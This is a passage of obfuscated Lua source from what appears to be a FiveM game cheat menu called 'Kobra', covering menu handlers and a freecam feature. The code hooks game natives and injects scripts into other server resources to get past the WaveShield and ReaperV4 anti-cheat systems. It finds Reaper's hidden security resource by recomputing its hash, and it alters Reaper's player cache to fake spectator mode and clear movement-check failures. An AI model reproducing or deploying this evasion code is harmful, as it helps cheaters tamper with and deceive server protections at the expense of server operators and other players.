,v182.value-v867 );elseif (v180=="Right") then v1092.value=math.min(v182.max or (350 -250) ,v182.value + v867 );else return;end end end v866=2;end end end break;end if (v181==(0 + 0)) then v182=v17[v15];if  not v182 then return;end v181=1;end end end;v12.Enter=function(v183) if ( not v17 or ( #v17==(0 -0))) then return;end local v184=v17[v15];if  not v184 then return;end if  not v24 then return;end if (v184.type=="subMenu") then table.insert(v20,{menu=v17,categories=v18,categoryIndex=v19});table.insert(v21,v184.label or "Submenu" );if (v184.type=="Server") then v12:UpdateListMenu();end if (v184.categories and (type(v184.categories)=="table") and ( #v184.categories>0)) then v18=v184.categories;v19=1 + 0 ;v17=v18[v19].tabs or {} ;v15=1;v183:UpdateElements(v17);return;end if (v184.subTabs and (type(v184.subTabs)=="table") and ( #v184.subTabs>(1486 -(35 + 1451)))) then v18=nil;v19=1454 -(28 + 1425) ;v17=v184.subTabs;v15=1994 -(941 + 1052) ;v183:UpdateElements(v17);return;end return;end if ((v184.type=="button") and v184.onSelect and (type(v184.onSelect)=="function")) then local v527=0 + 0 ;local v528;local v529;while true do if (v527==1) then return;end if (v527==0) then v528,v529=pcall(v184.onSelect);if  not v528 then v183:Debug("red","onSelect error: "   .. tostring(v529) );end v527=1515 -(822 + 692) ;end end end if ((v184.type=="checkbox") or (v184.type=="scrollable-checkbox") or (v184.type=="slider-checkbox")) then if v184.locked then v183:Notify("error","Kobra","This module has been disabled due to high detection rates!",3000);return;end if (type(v184.checked)~="boolean") then v184.checked=true;else v184.checked= not v184.checked;end if (v184.onSelect and (type(v184.onSelect)=="function")) then if (v184.type=="scrollable-checkbox") then local v843=0;local v844;local v845;while true do if (v843==0) then v844,v845=pcall(v184.onSelect,v184.values[v184.value],v184.checked);if  not v844 then v183:Debug("red","scrollable-checkbox onSelect error: "   .. tostring(v845) );end break;end end elseif (v184.type=="slider-checkbox") then local v918=0 -0 ;local v919;local v920;while true do if (v918==0) then v919,v920=pcall(v184.onSelect,v184.value,v184.checked);if  not v919 then v183:Debug("red","slider-checkbox onSelect error: "   .. tostring(v920) );end break;end end else local v921=0 + 0 ;local v922;local v923;while true do if (v921==(297 -(45 + 252))) then v922,v923=pcall(v184.onSelect,v184.checked);if  not v922 then v183:Debug("red","checkbox onSelect error: "   .. tostring(v923) );end break;end end end end v183:UpdateElements(v17);return;end if ((v184.type=="scrollable") or (v184.type=="scrollable-checkbox")) then local v530=0 + 0 ;while true do if (v530==(0 + 0)) then if (v184.values and (type(v184.values)=="table") and ( #v184.values>0)) then if v184.onSelect then v184.onSelect(v184.values[v184.value]);end end return;end end end if ((v184.type=="slider") or (v184.type=="slider-checkbox")) then local v531=0 -0 ;while true do if ((433 -(114 + 319))==v531) then if ((v184.scrollType=="onEnter") and v184.onSelect) then if (v184.type=="slider-checkbox") then v184.onSelect(v184.value,v184.checked or false );else v184.onSelect(v184.value);end end return;end end end end;local v64=false;v12.Backspace=function(v185) if ( #v20>0) then local v532=0 -0 ;local v533;while true do if (v532==1) then v17=v533.menu or v16 ;v18=v533.categories;v532=2 -0 ;end if (v532==(2 + 0)) then v19=v533.categoryIndex or 1 ;v15=1 -0 ;v532=3;end if (v532==3) then v185:UpdateElements(v17);break;end if (v532==(0 -0)) then v533=table.remove(v20);table.remove(v21);v532=1964 -(556 + 1407) ;end end else v185:HideUI();end end;v12.PrevCategory=function(v186) if ( not v18 or ( #v18==(1206 -(741 + 465)))) then return;end v19=v19-(466 -(170 + 295)) ;if (v19<1) then v19= #v18;end v17=v18[v19].tabs or {} ;v15=1 + 0 ;v186:UpdateElements(v17);v186:SendMessage({action="keydown",index=v15-1 });end;v12.NextCategory=function(v187) if ( not v18 or ( #v18==0)) then return;end v19=v19 + 1 + 0 ;if (v19> #v18) then v19=2 -1 ;end v17=v18[v19].tabs or {} ;v15=1 + 0 ;v187:UpdateElements(v17);v187:SendMessage({action="keydown",index=v15-(1 + 0) });end;v12.ToggleFreecam=function(v188,v189,v190) if (type(v189)~="boolean") then return;end if v189 then local v534=0 + 0 ;while true do if (v534==(1230 -(957 + 273))) then v32=true;MachoSendDuiMessage(v14,json.encode({action="displayFreecam",visible=true,weaponIndex=v34,vehicleIndex=v35}));v534=1;end if (v534==(1 + 0)) then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then MachoHookNative(5923634300000000000,function(...) return false, -(1 + 0);end);MachoHookNative(11673589000000000000 -2064561501 ,function(...) return false,GetEntityCoords(PlayerPedId());end);MachoHookNative(14327026000000000000 -(1505 + 444) ,function(...) return false,false;end);MachoHookNative(10181871000000000000,function(...) return false,0 -0 ;end);MachoHookNative(12777102000000000000 -  -2804399 ,function(...) return false,false;end);MachoHookNative(1858573000000000000 -(389 + 1391) ,function(...) return false,0 + 0 ;end);MachoHookNative(15349248000000000000,function(...) return false,0 + 0 ;end);MachoHookNative(18127728000000000000 -0 ,function(...) return false,true;end);MachoHookNative(11059360000000000000,function(...) return false,true;end);_G.KobraFreecamSpeed=v190;if  not _G.KobraFreecamThreadRunning then _G.KobraFreecamEnabled=true;_G.KobraFreecamThreadRunning=true;function hNative(v1123,v1124) local v1125=951 -(783 + 168) ;local v1126;while true do if (v1125==(0 -0)) then v1126=_G[v1123];if ( not v1126 or (type(v1126)~="function")) then return;end v1125=1 + 0 ;end if (v1125==(312 -(309 + 2))) then _G[v1123]=function(...) return v1124(v1126,...);end;break;end end end local function v1093(v1127) local v1128=0 -0 ;local v1129;local v1130;local v1131;while true do if (1==v1128) then v1131=math.abs(math.cos(v1130));return vector3( -math.sin(v1129) * v1131 ,math.cos(v1129) * v1131 ,math.sin(v1130));end if (v1128==(1212 -(1090 + 122))) then v1129=math.rad(v1127.z);v1130=math.rad(v1127.x);v1128=1 + 0 ;end end end local function v1094(v1132) local v1133=math.rad(v1132.z);return vector3(math.cos(v1133),math.sin(v1133),0 -0 );end local function v1095(v1134,v1135,v1136) local v1137=0 + 0 ;while true do if (v1137==(1119 -(628 + 490))) then return v1134;end if (v1137==0) then if (v1134<v1135) then return v1135;end if (v1134>v1136) then return v1136;end v1137=1;end end end hNative("RotationToDirection",function(v1138,...) return v1138(...);end);hNative("GetRightVector",function(v1139,...) return v1139(...);end);hNative("Clamp",function(v1140,...) return v1140(...);end);hNative("CreateThread",function(v1141,...) return v1141(...);end);hNative("Wait",function(v1142,...) return v1142(...);end);hNative("IsVehicleSeatFree",function(v1143,...) return v1143(...);end);hNative("PlayerPedId",function(v1144,...) return v1144(...);end);hNative("GetEntityCoords",function(v1145,...) return v1145(...);end);hNative("CreateCam",function(v1146,...) return v1146(...);end);hNative("DoesCamExist",function(v1147,...) return v1147(...);end);hNative("SetCamCoord",function(v1148,...) return v1148(...);end);hNative("SetCamRot",function(v1149,...) return v1149(...);end);hNative("RenderScriptCams",function(v1150,...) return v1150(...);end);hNative("DestroyCam",function(v1151,...) return v1151(...);end);hNative("SetFocusEntity",function(v1152,...) return v1152(...);end);hNative("SetTextFont",function(v1153,...) return v1153(...);end);hNative("SetTextProportional",function(v1154,...) return v1154(...);end);hNative("SetTextScale",function(v1155,...) return v1155(...);end);hNative("SetTextDropShadow",function(v1156,...) return v1156(...);end);hNative("SetTextEdge",function(v1157,...) return v1157(...);end);hNative("SetTextOutline",function(v1158,...) return v1158(...);end);hNative("SetTextCentre",function(v1159,...) return v1159(...);end);hNative("SetTextColour",function(v1160,...) return v1160(...);end);hNative("BeginTextCommandDisplayText",function(v1161,...) return v1161(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1162,...) return v1162(...);end);hNative("EndTextCommandDisplayText",function(v1163,...) return v1163(...);end);hNative("GetCamCoord",function(v1164,...) return v1164(...);end);hNative("GetCamRot",function(v1165,...) return v1165(...);end);hNative("IsControlPressed",function(v1166,...) return v1166(...);end);hNative("GetDisabledControlNormal",function(v1167,...) return v1167(...);end);hNative("TaskStandStill",function(v1168,...) return v1168(...);end);hNative("SetFocusPosAndVel",function(v1169,...) return v1169(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1170,...) return v1170(...);end);hNative("GetShapeTestResult",function(v1171,...) return v1171(...);end);hNative("IsControlJustPressed",function(v1172,...) return v1172(...);end);hNative("IsDisabledControlJustPressed",function(v1173,...) return v1173(...);end);hNative("IsEntityAVehicle",function(v1174,...) return v1174(...);end);hNative("TaskWarpPedIntoVehicle",function(v1175,...) return v1175(...);end);hNative("SetEntityCoords",function(v1176,...) return v1176(...);end);hNative("GiveWeaponToPed",function(v1177,...) return v1177(...);end);hNative("SetCurrentPedWeapon",function(v1178,...) return v1178(...);end);hNative("ShootSingleBulletBetweenCoords",function(v1179,...) return v1179(...);end);local v1096=GetEntityCoords(PlayerPedId());_G.KobraFreecamObject=CreateCam("DEFAULT_SCRIPTED_CAMERA",true);SetCamCoord(_G.KobraFreecamObject,v1096.x,v1096.y,v1096.z + 2 );SetCamRot(_G.KobraFreecamObject,0 + 0 ,0 -0 ,GetEntityHeading(PlayerPedId()),9 -7 );RenderScriptCams(true,false,774 -(431 + 343) ,true,true);CreateThread(function() while _G.KobraFreecamThreadRunning do Wait(0 -0 );if _G.KobraFreecamObject then local v1323=0 -0 ;local v1324;local v1325;local v1326;local v1327;local v1328;local v1329;local v1330;local v1331;local v1332;local v1333;local v1334;local v1335;local v1336;while true do if (v1323==(1 + 0)) then v1327=(IsControlPressed(0 + 0 ,1716 -(556 + 1139) ) and (v1326 + (16 -(6 + 9)))) or v1326 ;v1328=v1093(v1325);v1329=v1094(v1325);v1323=2;end if ((0 + 0)==v1323) then v1324=GetCamCoord(_G.KobraFreecamObject);v1325=GetCamRot(_G.KobraFreecamObject,2 + 0 );v1326=_G.KobraFreecamSpeed or (169.25 -(28 + 141)) ;v1323=1 + 0 ;end if (v1323==(2 -0)) then v1330,v1331,v1332=0,0 + 0 ,0;TaskStandStill(PlayerPedId(),1327 -(486 + 831) );SetFocusPosAndVel(v1324.x,v1324.y,v1324.z,0 -0 ,0 -0 ,0 + 0 );v1323=9 -6 ;end if (v1323==(1269 -(668 + 595))) then v1335=v1095(v1325.x-(v1334 * 5) , -89,81 + 8 );v1336=v1325.z-(v1333 * 5) ;SetCamRot(_G.KobraFreecamObject,v1335,v1325.y,v1336,2);break;end if (v1323==(1 + 3)) then if IsControlPressed(0 -0 ,325 -(23 + 267) ) then local v1552=1944 -(1129 + 815) ;while true do if (v1552==0) then v1330=v1330 + (v1329.x * v1327) ;v1331=v1331 + (v1329.y * v1327) ;break;end end end if IsControlPressed(0,22) then v1332=v1332 + v1327 ;end if IsControlPressed(387 -(371 + 16) ,36) then v1332=v1332-v1327 ;end v1323=5;end if (v1323==5) then SetCamCoord(_G.KobraFreecamObject,v1324.x + v1330 ,v1324.y + v1331 ,v1324.z + v1332 );v1333=GetDisabledControlNormal(1750 -(1326 + 424) ,1 -0 );v1334=GetDisabledControlNormal(0 -0 ,2);v1323=6;end if (v1323==3) then if IsControlPressed(118 -(88 + 30) ,32) then v1330=v1330 + (v1328.x * v1327) ;v1331=v1331 + (v1328.y * v1327) ;v1332=v1332 + (v1328.z * v1327) ;end if IsControlPressed(0,804 -(720 + 51) ) then v1330=v1330-(v1328.x * v1327) ;v1331=v1331-(v1328.y * v1327) ;v1332=v1332-(v1328.z * v1327) ;end if IsControlPressed(0 -0 ,1810 -(421 + 1355) ) then v1330=v1330-(v1329.x * v1327) ;v1331=v1331-(v1329.y * v1327) ;end v1323=6 -2 ;end end end end end);else _G.KobraFreecamEnabled=true;end else v48(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                print("hello im inside of a resource")
                    _G.KobraFreecamSpeed = ]]   .. v190   .. [[

                    if not _G.KobraFreecamThreadRunning then
                        _G.KobraFreecamEnabled = true
                        _G.KobraFreecamThreadRunning = true
                    
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        local function RotationToDirection(rot)
                            local z = math.rad(rot.z)
                            local x = math.rad(rot.x)
                            local num = math.abs(math.cos(x))
                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                        end

                        local function GetRightVector(rot)
                            local z = math.rad(rot.z)
                            return vector3(math.cos(z), math.sin(z), 0.0)
                        end

                        local function Clamp(val, min, max)
                            if val < min then return min end
                            if val > max then return max end
                            return val
                        end

                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                        local coords = GetEntityCoords(PlayerPedId())
                        _G.KobraFreecamObject = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                        SetCamCoord(_G.KobraFreecamObject, coords.x, coords.y, coords.z + 2.0)
                        SetCamRot(_G.KobraFreecamObject, 0.0, 0.0, GetEntityHeading(PlayerPedId()), 2)
                        RenderScriptCams(true, false, 0, true, true)
                        
                        CreateThread(function()
                            while _G.KobraFreecamThreadRunning do
                                Wait(0)

                                if _G.KobraFreecamObject then
                                    local coords = GetCamCoord(_G.KobraFreecamObject)
                                    local rot = GetCamRot(_G.KobraFreecamObject, 2)
                                    local beforeSpeed = _G.KobraFreecamSpeed or 0.25
                                    local speed = IsControlPressed(0, 21) and beforeSpeed + 1.0 or beforeSpeed
                                    local forward = RotationToDirection(rot)
                                    local right = GetRightVector(rot)
                                    local moveX, moveY, moveZ = 0, 0, 0

                                    TaskStandStill(PlayerPedId(), 10)
                                    SetFocusPosAndVel(coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)

                                    if IsControlPressed(0, 32) then moveX = moveX + forward.x * speed moveY = moveY + forward.y * speed moveZ = moveZ + forward.z * speed end
                                    if IsControlPressed(0, 33) then moveX = moveX - forward.x * speed moveY = moveY - forward.y * speed moveZ = moveZ - forward.z * speed end
                                    if IsControlPressed(0, 34) then moveX = moveX - right.x * speed moveY = moveY - right.y * speed end
                                    if IsControlPressed(0, 35) then moveX = moveX + right.x * speed moveY = moveY + right.y * speed end
                                    if IsControlPressed(0, 22) then moveZ = moveZ + speed end
                                    if IsControlPressed(0, 36) then moveZ = moveZ - speed end

                                    SetCamCoord(_G.KobraFreecamObject, coords.x + moveX, coords.y + moveY, coords.z + moveZ)

                                    local x = GetDisabledControlNormal(0, 1)
                                    local y = GetDisabledControlNormal(0, 2)
                                    local newPitch = Clamp(rot.x - y * 5, -89.0, 89.0)
                                    local newYaw = rot.z - x * 5

                                    SetCamRot(_G.KobraFreecamObject, newPitch, rot.y, newYaw, 2)
                                end
                            end
                        end)
                    else
                        _G.KobraFreecamEnabled = true
                    end
                ]] );end else if  not v30 then local v999=0 + 0 ;local v1000;local v1001;while true do if (v999==3) then if v1001 then MachoInjectResource(v1001,[[
                        _G["GetRenderingCam"] = function()
                            return 0
                        end

                        _G["GetDistanceBetweenCoords"] = function()
                            return 0
                        end
                    ]]);end MachoInjectResource("any",[[
                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "player_loaded", false, true)
                    if success then
                        print("Updated Cache 1 Successfully")
                    else
                        print("Failed to Update Cache 1")
                    end

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "LastFailedMovementChecks", 0, true)
                    if success then
                        print("Updated Cache 2 Successfully")
                    else
                        print("Failed to Update 2 Cache")
                    end

                    Wait(500)

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "NetworkIsInSpectatorMode", true, true)
                    if success then
                        print("Updated Cache 3 Successfully")
                    else
                        print("Failed to Update Cache 3")
                    end
                ]]);v999=4;end if (v999==(1083 -(286 + 797))) then print("[^5Kobra^7]: [^3DEBUG^7] >> Loading ReaperV4 Freecam Bypass");v1000=nil;v999=3 -2 ;end if (v999==(1 -0)) then function v1000() local v1201=false;local function v1202(v1306,v1307) v1307=v1307 or "072b0945-fdd6d8bb-2e1d0476-d15c8f4b-ed6db3e1" ;v1306=v1306   .. v1307 ;local v1308=5381;for v1337=440 -(397 + 42) , #v1306 do local v1338=0 + 0 ;local v1339;while true do if (v1338==(800 -(24 + 776))) then v1339=string.byte(v1306,v1337);v1308=(v1308 * 33)~v1339 ;break;end end end return v1308;end local v1203=GetConvar("reaper_security_resource","");local v1204=tonumber(v1203);if  not v1204 then return;end local v1205=GetNumResources() or (0 -0) ;local v1206={};for v1309=785 -(222 + 563) ,v1205-(1 -0)  do local v1310=0 + 0 ;local v1311;while true do if (v1310==(190 -(23 + 167))) then v1311=GetResourceByFindIndex(v1309);if (v1311 and (v1311~="")) then table.insert(v1206,v1311);end break;end end end if ( #v1206==(1798 -(690 + 1108))) then return;end local v1207=0 + 0 ;local v1208=nil;for v1312,v1313 in ipairs(v1206) do v1207=v1207 + 1 + 0 ;if (v1202(v1313)==v1204) then print("^7[^5Kobra^7]: [^3DEBUG^7]: Reaper Security Resource Found: "   .. v1313 );v1208=v1313;break;end local v1314=v1313:gsub("[-_]","");if ((v1314~=v1313) and (v1202(v1314)==v1204)) then v1208=v1314;break;end if ((v1207%(898 -(40 + 808)))==(0 + 0)) then Wait(0 -0 );end end if v1208 then return v1208;end end v1001=v1000();v999=2 + 0 ;end if (v999==(2 + 0)) then MachoInjectResource("ReaperV4",[[
                    _G["GetRenderingCam"] = function()
                        return 0
                    end

                    _G["GetDistanceBetweenCoords"] = function()
                        return 0
                    end
                ]]);Wait(138 + 112 );v999=574 -(47 + 524) ;end if (v999==4) then print("[^5Kobra^7]: [^2DEBUG^7] >> Loaded ReaperV4 Freecam Bypass");v30=true;break;end end end _G.KobraFreecamSpeed=v190;if  not _G.KobraFreecamThreadRunning then _G.KobraFreecamEnabled=true;_G.KobraFreecamThreadRunning=true;function hNative(v1021,v1022) local v1023=0 + 0 ;local v1024;while true do if (v1023==(2 -1)) then _G[v1021]=function(...) return v1022(v1024,...);end;break;end if (v1023==(0 -0)) then v1024=_G[v1021];if ( not v1024 or (type(v1024)~="function")) then return;end v1023=2 -1 ;end end end local function v1002(v1025) local v1026=math.rad(v1025.z);local v1027=math.rad(v1025.x);local v1028=math.abs(math.cos(v1027));return vector3( -math.sin(v1026) * v1028 ,math.cos(v1026) * v1028 ,math.sin(v1027));end local function v1003(v1029) local v1030=math.rad(v1029.z);return vector3(math.cos(v1030),math.sin(v1030),1726 -(1165 + 561) );end local function v1004(v1031,v1032,v1033) if (v1031<v1032) then return v1032;end if (v1031>v1033) then return v1033;end return v1031;end hNative("RotationToDirection",function(v1034,...) return v1034(...);end);hNative("GetRightVector",function(v1035,...) return v1035(...);end);hNative("Clamp",function(v1036,...) return v1036(...);end);hNative("CreateThread",function(v1037,...) return v1037(...);end);hNative("Wait",function(v1038,...) return v1038(...);end);hNative("IsVehicleSeatFree",function(v1039,...) return v1039(...);end);hNative("PlayerPedId",function(v1040,...) return v1040(...);end);hNative("GetEntityCoords",function(v1041,...) return v1041(...);end);hNative("CreateCam",function(v1042,...) return v1042(...);end);hNative("DoesCamExist",function(v1043,...) return v1043(...);end);hNative("SetCamCoord",function(v1044,...) return v1044(...);end);hNative("SetCamRot",function(v1045,...) return v1045(...);end);hNative("RenderScriptCams",function(v1046,...) return v1046(...);end);hNative("DestroyCam",function(v1047,...) return v1047(...);end);hNative("SetFocusEntity",function(v1048,...) return v1048(...);end);hNative("SetTextFont",function(v1049,...) return v1049(...);end);hNative("SetTextProportional",function(v1050,...) return v1050(...);end);hNative("SetTextScale",function(v1051,...) return v1051(...);end);hNative("SetTextDropShadow",function(v1052,...) return v1052(...);end);hNative("SetTextEdge",function(v1053,...) return v1053(...);end);hNative("SetTextOutline",function(v1054,...) return v1054(...);end);hNative("SetTextCentre",function(v1055,...) return v1055(...);end);hNative("SetTextColour",function(v1056,...) return v1056(...);end);hNative("BeginTextCommandDisplayText",function(v1057,...) return v1057(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1058,...) return v1058(...);end);hNative("EndTextCommandDisplayText",function(v1059,...) return v1059(...);end);hNative("GetCamCoord",function(v1060,...) return v1060(...);end);hNative("GetCamRot",function(v1061,...) return v1061(...);end);hNative("IsControlPressed",function(v1062,...) return v1062(...);end);hNative("GetDisabledControlNormal",function(v1063,...) return v1063(...);end);hNative("TaskStandStill",function(v1064,...) return v1064(...);end);hNative("SetFocusPosAndVel",function(v1065,...) return v1065(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1066,...) return v1066(...);end);hNative("GetShapeTestResult",function(v1067,...) return v1067(...);end);hNative("IsControlJustPressed",function(v1068,...) return v1068(...);end);hNative("IsDisabledControlJustPressed",function(v1069,...) return v1069(...);end);hNative("IsEntityAVehicle",function(v1070,...) return v1070(...);end);hNative("TaskWarpPedIntoVehicle",function(v1071,...) return v1071(...);end);hNative("SetEntityCoords",function(v1072,...) return v1072(...);end);hNative("GiveWeaponToPed",function(v1073,...) return v1073(...);end);hNative("SetCurrentPedWeapon",function(v1074,...) return v1074(...);end);hNative("ShootSingleBulletBetweenCoords",function(v1075,...) return v1075(...);end);local v1005=GetEntityCoords(PlayerPedId());_G.KobraFreecamObject=CreateCam("DEFAULT_SCRIPTED_CAMERA",true);SetCamCoord(_G.KobraFreecamObject,v1005.x,v1005.y,v1005.z + 1 + 1 );SetCamRot(_G.KobraFreecamObject,0,0 -0 ,GetEntityHeading(PlayerPedId()),1 + 1 );RenderScriptCams(true,false,479 -(341 + 138) ,true,true);CreateThread(function() while _G.KobraFreecamThreadRunning do Wait(0);if (_G.KobraFreecamEnabled and _G.KobraFreecamObject) then local v1209=0 + 0 ;local v1210;local v1211;local v1212;local v1213;local v1214;local v1215;local v1216;local v1217;local v1218;local v1219;local v1220;local v1221;local v1222;while true do if (v1209==(5 -2)) then if IsControlPressed(326 -(89 + 237) ,102 -70 ) then local v1462=0 -0 ;while true do if (v1462==(882 -(581 + 300))) then v1218=v1218 + (v1214.z * v1213) ;break;end if (v1462==0) then v1216=v1216 + (v1214.x * v1213) ;v1217=v1217 + (v1214.y * v1213) ;v1462=1221 -(855 + 365) ;end end end if IsControlPressed(0 -0 ,33) then local v1463=0 + 0 ;while true do if (v1463==(1235 -(1030 + 205))) then v1216=v1216-(v1214.x * v1213) ;v1217=v1217-(v1214.y * v1213) ;v1463=1;end if (v1463==(1 + 0)) then v1218=v1218-(v1214.z * v1213) ;break;end end end if IsControlPressed(0,32 + 2 ) then v1216=v1216-(v1215.x * v1213) ;v1217=v1217-(v1215.y * v1213) ;end v1209=290 -(156 + 130) ;end if (v1209==(8 -4)) then if IsControlPressed(0 -0 ,71 -36 ) then v1216=v1216 + (v1215.x * v1213) ;v1217=v1217 + (v1215.y * v1213) ;end if IsControlPressed(0,22) then v1218=v1218 + v1213 ;end if IsControlPressed(0 + 0 ,36) then v1218=v1218-v1213 ;end v1209=5;end if (v1209==(1 + 0)) then v1213=(IsControlPressed(69 -(10 + 59) ,6 + 15 ) and (v1212 + (4 -3))) or v1212 ;v1214=v1002(v1211);v1215=v1003(v1211);v1209=2;end if (v1209==(1165 -(671 + 492))) then v1216,v1217,v1218=0 + 0 ,1215 -(369 + 846) ,0 + 0 ;TaskStandStill(PlayerPedId(),9 + 1 );SetFocusPosAndVel(v1210.x,v1210.y,v1210.z,0,1945 -(1036 + 909) ,0);v1209=3 + 0 ;end if ((0 -0)==v1209) then v1210=GetCamCoord(_G.KobraFreecamObject);v1211=GetCamRot(_G.KobraFreecamObject,205 -(11 + 192) );v1212=_G.KobraFreecamSpeed or (0.25 + 0) ;v1209=1;end if (v1209==6) then v1221=v1004(v1211.x-(v1220 * (180 -(135 + 40))) , -(215 -126),89);v1222=v1211.z-(v1219 * (4 + 1)) ;SetCamRot(_G.KobraFreecamObject,v1221,v1211.y,v1222,2);break;end if (5==v1209) then SetCamCoord(_G.KobraFreecamObject,v1210.x + v1216 ,v1210.y + v1217 ,v1210.z + v1218 );v1219=GetDisabledControlNormal(0 -0 ,1 -0 );v1220=GetDisabledControlNormal(176 -(50 + 126) ,5 -3 );v1209=2 + 4 ;end end end end end);else _G.KobraFreecamEnabled=true;end end break;end end else local v535=0;while true do if (v535==(1414 -(1233 + 180))) then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then local v1006=969 -(522 + 447) ;while true do if (v1006==(1427 -(107 + 1314))) then hNative("TaskWarpPedIntoVehicle",function(v1223,...) return v1223(...);end);hNative("SetEntityCoords",function(v1224,...) return v1224(...);end);hNative("GiveWeaponToPed",function(v1225,...) return v1225(...);end);hNative("SetCurrentPedWeapon",function(v1226,...) return v1226(...);end);hNative("ShootSingleBulletBetweenCoords",function(v1227,...) return v1227(...);end);RenderScriptCams(false,false,0 + 0 ,true,true);v1006=21 -14 ;end if (v1006==(3 + 2)) then hNative("SetFocusPosAndVel",function(v1228,...) return v1228(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1229,...) return v1229(...);end);hNative("GetShapeTestResult",function(v1230,...) return v1230(...);end);hNative("IsControlJustPressed",function(v1231,...) return v1231(...);end);hNative("IsDisabledControlJustPressed",function(v1232,...) return v1232(...);end);hNative("IsEntityAVehicle",function(v1233,...) return v1233(...);end);v1006=6;end if (v1006==(1 -0)) then hNative("PlayerPedId",function(v1234,...) return v1234(...);end);hNative("GetEntityCoords",function(v1235,...) return v1235(...);end);hNative("CreateCam",function(v1236,...) return v1236(...);end);hNative("SetCamCoord",function(v1237,...) return v1237(...);end);hNative("SetCamRot",function(v1238,...) return v1238(...);end);hNative("RenderScriptCams",function(v1239,...) return v1239(...);end);v1006=7 -5 ;end if (v1006==(1914 -(716 + 1194))) then hNative("EndTextCommandDisplayText",function(v1240,...) return v1240(...);end);hNative("GetCamCoord",function(v1241,...) return v1241(...);end);hNative("GetCamRot",function(v1242,...) return v1242(...);end);hNative("IsControlPressed",function(v1243,...) return v1243(...);end);hNative("GetDisabledControlNormal",function(v1244,...) return v1244(...);end);hNative("TaskStandStill",function(v1245,...) return v1245(...);end);v1006=1 + 4 ;end if (v1006==(1 + 6)) then if _G.KobraFreecamObject then DestroyCam(_G.KobraFreecamObject,false);_G.KobraFreecamObject=nil;end SetFocusEntity(PlayerPedId());break;end if ((506 -(74 + 429))==v1006) then hNative("SetTextEdge",function(v1246,...) return v1246(...);end);hNative("SetTextOutline",function(v1247,...) return v1247(...);end);hNative("SetTextCentre",function(v1248,...) return v1248(...);end);hNative("SetTextColour",function(v1249,...) return v1249(...);end);hNative("BeginTextCommandDisplayText",function(v1250,...) return v1250(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1251,...) return v1251(...);end);v1006=4;end if (v1006==(3 -1)) then hNative("DestroyCam",function(v1252,...) return v1252(...);end);hNative("SetFocusEntity",function(v1253,...) return v1253(...);end);hNative("SetTextFont",function(v1254,...) return 